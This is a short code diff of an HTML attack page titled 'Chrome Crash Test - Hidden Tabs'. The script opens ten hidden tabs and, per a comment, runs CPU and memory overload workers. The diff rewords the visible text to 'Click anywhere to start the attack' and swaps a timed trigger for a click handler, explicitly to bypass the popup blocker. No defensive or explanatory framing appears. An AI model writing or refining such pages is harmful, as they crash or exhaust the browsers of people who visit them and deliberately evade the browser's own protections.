@@ -5,7 +5,7 @@
 </head>
 <body>
     <h1>Chrome Crash Test - Hidden Tabs</h1>
-    <p>This page will open multiple hidden tabs.</p>
+    <p>Click anywhere to start the attack.</p>
 
     <script>
         function openHiddenWindow(numTabs) {
@@ -17,10 +17,10 @@
             }
         }
 
-        // Call function after a short delay to bypass pop-up blockers
-        setTimeout(() => {
-            openHiddenWindow(10); // Adjust number of tabs if needed
-        }, 1000);
+        // Wait for user interaction to bypass popup blocker
+        document.addEventListener("click", function() {
+            openHiddenWindow(10); // Adjust number of tabs as needed
+        });
 
         // Multi-Threaded CPU Overload (Memory Consumption)
         function startWorker() {
